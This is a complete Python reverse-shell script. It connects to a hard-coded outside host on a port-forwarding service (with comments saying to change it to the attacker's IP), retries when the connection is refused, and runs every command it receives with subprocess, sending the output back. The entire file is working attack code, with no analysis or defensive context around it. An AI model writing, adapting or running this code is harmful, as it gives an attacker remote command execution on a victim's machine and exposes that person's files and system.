import socket
import subprocess
import time
import threading
import os


def connect():
    attacker_ip = 'samirshariff-44024.portmap.io'  # Change to your attacker's IP
    attacker_port = 44024  # Change to your attacker's port

    while not stop_event.is_set():
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        try:
            s.connect((attacker_ip, attacker_port))
            print("Connected to the listener.")
            while True:
                command = s.recv(1024).decode()
                if command.lower() == 'exit':
                    print("Received stop command. Stopping...")
                    stop_event.set()
                    break
                output = subprocess.getoutput(command)
                s.send(output.encode())
        except ConnectionRefusedError:
            print("Connection refused. Retrying in 5 seconds...")
            time.sleep(5)
        except Exception as e:
            print(f"An error occurred: {e}")
        finally:
            s.close()

if __name__ == "__main__":
    stop_event = threading.Event()
    connection_thread = threading.Thread(target=connect)
    connection_thread.start()

    try:
        connection_thread.join()  # Wait for the connection thread to finish
    except KeyboardInterrupt:
        stop_event.set()
        print("\nStopping...")
        connection_thread.join()  # Wait for the connection thread to finish

